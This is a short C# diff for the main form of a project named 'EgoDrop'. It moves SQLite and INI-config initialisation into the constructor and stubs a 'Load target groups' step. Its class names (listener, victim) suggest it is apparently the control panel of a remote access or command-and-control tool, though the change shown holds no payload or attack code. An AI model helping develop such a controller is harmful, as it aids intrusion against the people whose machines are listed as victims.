@@ -5,18 +5,21 @@ namespace EgoDrop
         public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();
 
         private clsSqlite m_sqlite { get; set; }
-        private clsListener m_listener { get; set; }
+        private clsIniMgr m_iniMgr { get; set; }
 
         public frmMain()
         {
             InitializeComponent();
+
+            m_sqlite = new clsSqlite("data.db");
+            m_iniMgr = new clsIniMgr("config.ini");
         }
 
         private clsVictim fnGetVictimFromTag(ListViewItem item) => (clsVictim)item.Tag;
 
         private void fnSetup()
         {
-            m_sqlite = new clsSqlite("data.db");
+            //Load target groups
         }
 
         private void frmMain_Load(object sender, EventArgs e)
